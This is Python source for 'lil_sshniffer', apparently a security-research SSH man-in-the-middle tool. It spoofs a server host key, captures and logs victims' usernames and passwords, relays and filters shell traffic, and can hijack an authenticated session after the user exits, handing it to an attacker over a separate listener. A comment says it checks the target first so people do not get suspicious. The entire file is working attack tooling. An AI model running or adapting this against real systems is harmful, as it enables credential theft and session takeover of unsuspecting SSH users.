#!/usr/bin/python
# Author: Lilith Wyatt <(^,^)>
#------------------------------------------------------------------
#
# SSH proxy/mitm using paramiko. Dumps passwords and such.
# Can also specify ssh connection options. Created standalone,
# utilized by Decept.py
#
# Can filter inbound and outbound traffic of the SSH connection,
# look at lil_netkit.py for further information. 
#
#------------------------------------------------------------------
# November 2015, created within ASIG
# Author Lilith Wyatt (liwyatt)
#------------------------------------------------------------------
#
# Copyright (c) 2015-2017 by Cisco Systems, Inc.
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are met:
# 1. Redistributions of source code must retain the above copyright
#    notice, this list of conditions and the following disclaimer.
# 2. Redistributions in binary form must reproduce the above copyright
#    notice, this list of conditions and the following disclaimer in the
#    documentation and/or other materials provided with the distribution.
# 3. Neither the name of the Cisco Systems, Inc. nor the
#    names of its contributors may be used to endorse or promote products
#    derived from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS "AS IS" AND ANY
# EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
# DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDERS BE LIABLE FOR ANY
# DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
# (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
# ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
# SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
#------------------------------------------------------------------
    

from lil_netkit import *
import threading
import datetime
import paramiko
import argparse
import getpass
import socket
import select
import time
import sys
import os

# Connection Vars
IP = "127.0.0.1"
PORT = 22222
HIJINX_PORT = 9999
DST_IP = ""
DST_PORT = 22

TIMEOUT = 1

# Assorted Vars
host_key = ""
retry_hack = False
sniff = False

# Take over connection if the target exits
conn_hijack = False
shell_banner = "[>.>]#"

# Authentication Vars
username = ""
password = ""
auth_pass = True
auth_none = False
auth_key = False

filtering = False
cisco_mode = False

# SSH Channel Vars
interactive = False
single_command = ""
subsystem = ""

# Hooks
inhook = None
outhook = None

#COLORS!!!
ATTN = '\033[96m'
PURP = '\033[0;35m'
GOOD = '\033[92m'
WARN = '\033[93m'
BAD = '\033[91m'
CLEAR = '\033[00m'

def print_attn(string):
    print(ATTN + string + CLEAR)
def print_purp(string):
    print(PURP + string + CLEAR)
def print_good(string):
    print(GOOD + string + CLEAR)
def print_warn(string):
    print(WARN + string + CLEAR)
def print_bad(string):
    print(BAD + string + CLEAR)

class sshniffer(paramiko.server.ServerInterface):

    def __init__(self,endpoint,logfile):
        if args.debug:
            print_good("[^.^] Mitm server started!!")
        self.endpoint = endpoint    
        self.logfile = logfile
        self.rhost,self.rport = endpoint.getpeername()

        self.netkit_flag = threading.Event()
            
        if cisco_mode:
            self.netkit = lil_netkit(mode="cisco") 
        else:
            self.netkit = lil_netkit() 
        

    def check_channel_request(self, kind, chanid):
        return paramiko.OPEN_SUCCEEDED

    def check_auth_password(self,username,password):
        print_attn("[-.-] Username: %s%s" % (WARN,username))
        print_attn("[>.>] password: %s%s" % (WARN,password))

        #we try authenticating against the endpoint    
        #this should block till we know if success    
        try:
            self.endpoint.auth_password(username,password,None,False)

            if self.endpoint.is_authenticated():
                self.logfile.write("[^.^] Good login | %s:%s\n" % (username,password))
                self.logfile.write("__________________________\n")
                return paramiko.AUTH_SUCCESSFUL

        except Exception as e:
            print(str(e))
            self.logfile.write("[~.~] Bad login | %s:%s\n" % (username,password))
            self.logfile.write("__________________________\n")
            self.retry_hack()    
            
            return paramiko.AUTH_FAILED

        return paramiko.AUTH_FAILED

    def check_channel_shell_request(self, channel):
        return True
    
    def check_channel_pty_request(self, channel, term, width, height, pixelwidth, pixelheight, modes):
        if args.pty:
            return True
        else:
            return False

    def retry_hack(self):
        if retry_hack: #check for global flag first
            self.endpoint.close()
            dstsock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            dstsock.connect((self.rhost,self.rport))
            self.endpoint = paramiko.Transport(dstsock) 
            self.endpoint.start_client()

    def get_endpoint(self):
        return self.endpoint



class hijacked_sshniffer(paramiko.server.ServerInterface):
        
    def __init__(self,logfile):
        print_good("[^.^] Mitm server started!!")
        if args.debug:
            print_good("[^.^] Mitm server started!!")
        self.logfile = logfile

    def check_channel_request(self, kind, chanid):
        return paramiko.OPEN_SUCCEEDED

    def check_auth_password(self,username,password):
        print_attn("[-.-] Username: %s%s" % (WARN,username))
        print_attn("[>.>] password: %s%s" % (WARN,password))
        return paramiko.AUTH_FAILED

    def get_allowed_auths(self, username):
        return 'password,publickey'

    def check_channel_shell_request(self, channel):
        return True

    def check_auth_publickey(self,username,key):
    # host_key is our private key
        print("username: %s" % username)
        if username == "lil_sshniffer" and key==host_key:
            print("success!")
            return paramiko.AUTH_SUCCESSFUL
        print("FAIL")
        return paramiko.AUTH_FAILED

    def check_channel_pty_request(self, channel, term, width, height, pixelwidth, pixelheight, modes):
        if args.pty:
            return True
        else:
            return False


def main(args): 
    global host_key
    global IP
    global PORT
    global DST_IP
    global DST_PORT
    global host_key
    global inhook
    global outhook

    sock = None
    dst_sock = None
    kill_switch = threading.Event()

    try:
        host_key = paramiko.rsakey.RSAKey(filename=args.spoof_key)
        print_good("[^.^] Rsa key read in: %s" % args.spoof_key)
    except Exception as e:
        print(e)
        print_bad("[x.x] Unable to open keyfile %s" % args.spoof_key)
        print_bad("[-_-] Might need to generate with: ssh-keygen -t rsa -N \"\" -f id_rsa")
        sys.exit()

    if args.lhost:
        IP = args.lhost
    if args.lport:
        PORT = args.lport
    if args.rhost:
        DST_IP = args.rhost
    if args.rport:
        DST_PORT = args.rport 


    if args.hookfile:
        import imp
        # if inbound_hook == outbound_hook file, no biggie
        try:
            imp.load_source("hooks",args.hookfile)
            try:
                inhook = sys.modules["hooks"].inbound_hook
                print_purp("Loaded inbound_hook from %s" % args.hookfile)
            except:
                pass

            try:
                outhook = sys.modules["hooks"].outbound_hook
                print_purp("Loaded outbound_hook from %s" % args.hookfile)
            except:
                pass

        except Exception as e:
            print(e)
            pass


    # Only care about these, since we might just be piping plain text through an ssh tunnel instead of sniffing
    if not DST_IP:
        print_bad("[x.x] Invalid lhost|lport|rhost|rport")
        sys.exit()

    # * test to make sure the destination is actually open first
    # don't want people to get suspicious

    if sniff:
        try:
            test_sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)    
            test_sock.connect((DST_IP,DST_PORT))
            test_sock.close()
            if args.debug:
                print_purp("[$.$] Destination Host SSH port open %s%s:%d" % (WARN,DST_IP,DST_PORT))
        except:
            print_bad("[x.x] Endpoint %s:%d is not responding...Exiting" % (DST_IP,DST_PORT))
            sys.exit()    


    try:
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)    
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((IP,PORT))
        print_attn("[>,0] Bound to local SSH interface %s%s:%d" % (WARN,IP,PORT))
    except:
        print_bad("[x.x] Unable to bind to %s:%d" % (IP,PORT))
        sys.exit()

    sock.listen(10)
    print_good("[-.-]zzzZZZZ")

    hijack_flag = threading.Event()    
    if args.hijack:
        hijack_flag.set() 

    while True:
        try:
            client,addr = sock.accept()
        except KeyboardInterrupt:
            break
        print_attn("[0.0] Received connection from %s%s:%d" % (WARN,addr[0],addr[1]))

        try:
            dst_sock= socket.socket(socket.AF_INET,socket.SOCK_STREAM)    
            dst_sock.connect((DST_IP,DST_PORT))
            print_good("[^.^] Connected socket to destination SSH server %s%s:%d"%(WARN,DST_IP,DST_PORT))
        except:
            print_bad("[x.x] Endpoint %s:%d is not responding...Exiting" % (DST_IP,DST_PORT))
            client.send("ssh: connect to host %s port %d: Connection refused\n" % (DST_IP,DST_PORT))
            client.close()
            sys.exit()    

        client_thread = threading.Thread(target=client_handler_helper,
                                        args=(client,
                                              addr,
                                              dst_sock,
                                              kill_switch,
                                              hijack_flag,
                                              inhook,
                                              outhook))    
        client_thread.start()
    
    sock.close()    
    print_attn("[^.^] Thank you for choosing lil_sshniffer")
    kill_switch.set()
    sys.exit()



def client_handler_helper(sock,address,dst_sock,kill_switch,hijack_flag,inhook,outhook):
    dt = datetime.datetime.today()
    logfile_name = dt.__str__() + ".log" 
    print_purp("[c.c] Logging to %s" % logfile_name)
    
    try:
        os.mkdir('logs')
    except:
        pass
    
    with open("logs/%s"%(logfile_name),"w") as logfile:
        logfile.write("<(^.^)>") 
        logfile.write("Inbound connection from %s:%d\n" %address)
        logfile.write("Posing as: %s:%d\n" % (DST_IP,DST_PORT))   
        logfile.write("_________________\n")    

        # connect outbound ssh connection
        out_trans = paramiko.Transport(dst_sock) 
        out_trans.start_client()
        print_attn("[0.<] Started Transport session....")

        if sniff == True:
            ssh_client_handler(sock,address,out_trans,logfile,kill_switch,hijack_flag,inhook,outhook)
        else:
            tcp_client_handler(sock,address,out_trans,logfile,kill_switch,inhook,outhook) 


def create_ssh_channel(out_trans):
    # - Regardless of if we're sniffing, still need to start an SSH Session
    try:
        out_chan = out_trans.open_session()
        # Are we going interactive/executing a command/using a subsystem?
        if interactive or sniff:
            out_chan.get_pty()
            out_chan.invoke_shell()
            out_chan.settimeout(5)
        elif subsystem:
            out_chan.invoke_subsystem(subsystem) 
        elif single_command:
            out_chan.exec_command(single_command)
        else:
            print_bad("[?.?] How did you wind up here?")
            raise Exception("Unknown options") 
        print_purp("[;.;] SSH session with destination sucessfully created")

    except:
        print_bad("[x.x] Couldn't connect to endpoint....DIPSET")
        in_trans.close()
        out_trans.close()
        sys.exit()

        resp_expected = False
        print_attn("[@.@] Starting to connect the SSH sessions. Good luck ^.^;")
    
    return out_chan
     
def tcp_client_handler(sock,address,out_trans,logfile,kill_switch,inhook,outhook):
    inb = ""
    outb = ""

    auth_ssh(out_trans,address)  
    out_chan = create_ssh_channel(out_trans)

    while True:
        try:
            if kill_switch.is_set():
                print("Thread closing") 
                break

            inb = get_bytes(out_chan)    

            if inhook:
                inb = inhook(inb,userdata)

            if len(inb):
                print_warn(inb)
                sock.send(inb)    


            outb = get_bytes(sock) 
            if outhook:
                outb = outhook(outb,userdata)

            if len(outb):  
                print_attn(outb)
                out_chan.send(outb)
            
            if not len(inb) and not len(outb):
                print("[*.*] No more data")
                break

        except KeyboardInterrupt or socket.error:
            break    
        '''
        except Exception as e:
            print str(e)
            break
        '''
           

    print("[>.<] Connection to %s:%d closed!" % address)
    sock.close()
    out_trans.close()
    sys.exit()
 

def ssh_client_handler(sock,address,out_trans,logfile,kill_switch,hijack_flag,inhook,outhook):
    # If we're sniffing ssh, we also need to create
    # an SSH server that's listening for inbound conns
    in_trans = paramiko.Transport(sock)
    in_trans.load_server_moduli()
    in_trans.add_server_key(host_key)    
    ssh_sniff = sshniffer(endpoint=out_trans,logfile=logfile)
    resp_expected = False
 
    enable=False

    # this is the dict for keeping track of things from the inbound/outbound hooks.
    userdata = {}

    try:
        in_trans.start_server(server=ssh_sniff)
        if args.debug:
            print_good("[0.0] Sucessfully negotiated SSH with inbound target")
    except:
        print_bad("[x.x] Couldnt negotiate ssh with inbound target")
        sys.exit(1)

    #client authenticates to us, we pass along to endpoint, and respond accordingly
    if args.debug:
        print("[<.<] Accepting transport...")

    in_chan = in_trans.accept(60)
    if retry_hack:    
        out_trans = ssh_sniff.get_endpoint()

    if args.debug:
        print("[?.?] Transport accepted?")

    if not in_chan:
        print_bad( "[x.x] Failed Auth, killing connection")
        in_trans.close()
        out_trans.close()    
        sys.exit(1)

    if args.debug:
        print_good("[o.o] Negotiated shell session with inbound target")
    
    conn_hijack = False
    if args.hijack:
        conn_hijack = True
        
    #create our channel (exec/shell/subsystem...)
    out_chan = create_ssh_channel(out_trans)

    #needed since the pty causes only 1 char at a time to be sent >_>
    log_buffer = ""

    echo_expected = False

    hijack_buff = ""
    # hijack buff for detecting "exit\r"

    if filtering:
        ssh_sniff.netkit.init_client_buffer(in_chan,out_chan)
        
    
    while True and not kill_switch.is_set():    
        # since we're not using select()
        time.sleep(.01)    
        
        tmp = "" 
        #take bytes from impersonated ssh, send to user
        if out_chan.recv_ready():
            inb = get_bytes(out_chan)    
            if len(inb):
                # save response for output
                print_warn(inb)
                #print "Prefilter inb: %s" % repr(inb) 
            
                if filtering:
                    inb = ssh_sniff.netkit.inbound_filter(inb) 
        
                # defined with --hook <hookfile> => def inbound_hook(inbound_msg):
                if inhook:
                    inb = inhook(inb,userdata)

                if len(inb):
                    #print "Post filter inb: %s" % repr(inb) 
                    in_chan.send(inb)    
                    resp_expected = False

                    #don't want to log char-by-char reponses
                    if len(inb) > 3:
                        logfile.write("<<<<<<<<<<<<<\n")
                        logfile.write(inb + '\n')
                
                inb = ""
                
        #test if endpoint is closed or not
        try:
            out_chan.send("")    
        except Exception as e:
            print_purp(str(e))
            break

        #take bytes from user, send to impersonated
        
        if in_chan.recv_ready():
            outb = get_bytes(in_chan)    

            if len(outb):
                log_buffer+=outb

                if filtering:
                    outb = ssh_sniff.netkit.outbound_filter(outb) 

                # defined with --hook <hookfile> => def inbound_hook(inbound_msg):
                if outhook:
                    outb = outhook(outb,userdata)

                if not len(outb):
                    continue

                if outb[-1] == "\r":
                    logfile.write(">>>>>>>>>>>>>\n")
                    logfile.write(repr(log_buffer)+ '\n')
                    log_buffer = ""

                print_attn(repr(outb))
                try:
                    out_chan.send(outb)    
                    if filtering:
                        # Due to SSH, when we send anything,
                        # we should get echo back of what we sent. 
                        # Discard immediately.
                        discard = ""
                        while len(discard) < len(outb):
                            discard += get_bytes(out_chan)

                        newline_ind = discard.find("\r")
                        print_attn("ignoring: %s\n"%discard[:newline_ind])
                        discard = discard[newline_ind:]
                        # since we're discarding newline
                        in_chan.send(discard) 

                except Exception as e:
                    print_purp(str(e))
                    break
                resp_expected = True
                inb = ""
    
    if filtering:
        try:
            if ssh_sniff.netkit.client_buffer.hijack_flag == True:
                print("Setting Hijack")
                hijack_flag.set()
        except Exception as e:
            print(e) 
            pass
    ######
    ##/end while True and not kill_switch.is_set():    
    ######

    # close for the client
    in_trans.close()
    prev_inb = ""

    if not conn_hijack or not hijack_flag.is_set(): 
        out_trans.close()
        print_warn("[;.;] Client connection closed %s:%d" % (address[0],address[1]))
        print_good("[-.-]zzzZZZZZzzzzzZZ")
    else:
        hijack_flag.clear()

    # Begin hijack listener
        try:
            sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)    
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((IP,HIJINX_PORT))
            print_attn("[>,0] Bound to local SSH interface %s%s:%d" % (WARN,IP,HIJINX_PORT))
        except:
            print_bad("[x.x] Unable to bind to %s:%d" % (IP,HIJINX_PORT))
            return

        sock.listen(1)

        keep_alive_flag = threading.Event()
        out_chan_keepalive = threading.Thread(target=chan_keepalive,args=(keep_alive_flag,out_chan))
        out_chan_keepalive.start()
        
        while True:
        
            print_good("[-.-]Hijinx: zzzZZZZ")

            try:
                client,addr = sock.accept()
                print_attn("[!.!] connection from %s:%d"%(addr[0],addr[1]))
                
            except KeyboardInterrupt:
                print_attn("[^.^] Killing the hijinx")
                return

            in_trans = paramiko.Transport(client)
            in_trans.load_server_moduli()
            in_trans.add_server_key(host_key)    
            ssh_sniff = hijacked_sshniffer(logfile=logfile)
         
            try:
                in_trans.start_server(server=ssh_sniff)
                if args.debug:
                    print_good("[0.0] Sucessfully negotiated SSH with hijacker")
            except:
                print_bad("[x.x] Couldnt negotiate ssh with inbound target")
                return


            in_chan = in_trans.accept(30)
            
            if not in_chan:
                print_bad( "[x.x] Failed Auth, killing connection")
                continue
            else:
                break
       
        # end keepalive
        keep_alive_flag.set()

        in_chan.send("[^.^] Welcome to the Hijinx server [^.^]\r") 

        logfile.write("HIJAX" * 5)

        while True and not kill_switch.is_set():    
            # since we're not using select()
            time.sleep(.01)    
            
            tmp = "" 
            #take bytes from impersonated ssh, send to user
            if out_chan.recv_ready():
                inb = get_bytes(out_chan)    
                if len(inb):
                    # save response for output
                    print_warn(inb)
                    #print "INB: %s" % repr(inb) 

                    in_chan.send(inb)    
                    resp_expected = False

                #don't want to log char-by-char reponses
                if len(inb) > 3:
                    logfile.write("<<<<<<<<<<<<<\n")
                    logfile.write(inb + '\n')
                    
                inb = ""
                    
            #If there's no output from impersonated, just break
            if resp_expected:
                try:
                    #if we get bytes, false alarm
                    inb = get_bytes(out_chan)    
                    print_warn(inb)
                    #print "INB: %s" % repr(inb) 
                    in_chan.send(inb)    
                    inb = ""
                    resp_expected = False
                    logfile.write(inb + '\n')
                except Exception as e:
                    print(str(e))
                    #no bytes => conn closed
                    break

            if in_chan.recv_ready():
                outb = get_bytes(in_chan)    
        
                if len(outb):
                    log_buffer+=outb

                if outb == "\r":
                    logfile.write(">>>>>>>>>>>>>\n")
                    logfile.write(repr(log_buffer)+ '\n')
                    log_buffer = ""

                print_attn(repr(outb))
                try:
                    out_chan.send(outb)    
                except Exception as e:
                    print_purp(str(e))
                    break
                resp_expected = True
                inb = ""

        # close for the client
        in_trans.close()
        hijack_flag.set()

# that's connected via ssh on the other side 
def auth_ssh(dst_transport,addr):
    global username
    global password

    retry_count = 0

    if auth_pass:
        #either username or pass not provided over cli, ask for creds 
        if not username or not password:
            while not dst_transport.is_authenticated() and retry_count < 3: 
                #check cmdline args for user/pass first
                try:
                    if not username:
                        username = raw_input("[o.o] Username:") 
                    if not password or retry_count > 0:
                        password = getpass.getpass("[~.~] Password:") 
                    dst_transport.auth_password(username,password,None,False)
                except KeyboardInterrupt:
                    return
                except Exception as e:
                    print(e)
                    retry_count+=1
        # try to auth. On fail, kill.
        else:
            try:
                dst_transport.auth_password(username,password,None,False)
            except:
                pass
    
    #elif auth_key:
    #elif auth_none:

    if not dst_transport.is_authenticated(): 
        print_bad("[x.x] Unable to authenticate to %s:%d" % (addr[0],addr[1]))
        print_bad("[X.X] Exiting...")
        sys.exit()

    return 


def chan_keepalive(event_flag,channel):
    while not event_flag.is_set():
        try: 
            channel.send("\x7f")
        except:
            return
        time.sleep(1)


def get_bytes(chan,timeout=0):
    tmp = ""
    buf = ""
    if not timeout:
        timeout = TIMEOUT
    chan.settimeout(timeout)
    
    while True:
        tmp = ""
        try:
            tmp = chan.recv(4096)        
            if tmp:
                buf+=tmp    
            if len(tmp) < 4096:
                break
        except socket.timeout:
            break
        except Exception as e:
            raise Exception

    return buf    



if __name__ == "__main__":
    
    if len(sys.argv) < 2:
        sys.argv.append("-h")

    desc = (GOOD + "[^.^] lil_sshniffer.py [^.^]" + PURP +
        "  ~For all your sshniffing needs~\r\n" + ATTN
    )

    parser = argparse.ArgumentParser(description=desc)    
    parser.add_argument("rhost",help=ATTN+"Remote address to connect to"+WARN) 

    parser.add_argument("--lhost",help="Local address to bind to") 
    parser.add_argument("--lport",help="Local port to bind to",type=int)
    parser.add_argument("--rport",help="Remote port to connect to",type=int)
 
    parser.add_argument("-d", "--debug", action="store_true", help="Extra output")
    parser.add_argument("-l", "--logging",help="Enable/disable logging",action="store_true",default=True ) 
    parser.add_argument("-P","--pty",help="Allocate a pty also",action="store_true",default=True) 
    parser.add_argument("-s","--sniff",help="Create an inbound and outbound SSH Server",action="store_true")
    parser.add_argument("-k","--spoof_key",help="RSA key to use for spoofing",default="id_rsa")    

    parser.add_argument("-r","--retry",help="Do the retry hack >_<",action="store_true")
    parser.add_argument("-a","--auth_key",help="Key for authenticating outbound")
    parser.add_argument("-u","--username",help="Username for outbound connection (leave blank for prompt)",default="root")
    parser.add_argument("-p","--password",help="Password for outbound connection (leave blank for prompt)")
    #parser.add_argument("-c","--channels",help="Amount of channels to request over transport",type=int,default=1)
    parser.add_argument("-t","--timeout",help="Timeout for sockets",type=int)

    ssh_type = parser.add_mutually_exclusive_group()
    ssh_type.add_argument("--subsystem","-S",help="Execute the given subsystem (scp/sftp/ssh/netconf/etc)")
    ssh_type.add_argument("--execute","-e",help="Execute a single command")
    ssh_type.add_argument("--interactive","-i",action="store_true",help="Requests a shell w/pty (default)")

    parser.add_argument("--hookfile",help="Will import inbound_hook and/or outbound_hook functions/utilize after netfilter, if any.")
    
    parser.add_argument("-f","--filtering",help="Filter input and output w/lil_netkit",action="store_true")
    parser.add_argument("-?","--cisco",help="For when you're filtering on a connection with a Cisco CLI device",action="store_true")
    parser.add_argument("-j","--hijack",help="Hijack ssh session after target quits"+CLEAR,action="store_true")
    
    args = parser.parse_args()
    
    if args.retry:
        retry_hack = True
    if args.sniff:
        sniff = True
    if args.username:
        username = args.username 
    if args.password:
        password = args.password
    if args.timeout:
        TIMEOUT = args.timeout
    if args.subsystem:
        subsystem = args.subsystem
    elif args.execute:
        single_command = args.execute 
    else:
        interactive = True
    if args.filtering:
        filtering = True
    if args.cisco:
        cisco_mode = True

    main(args)
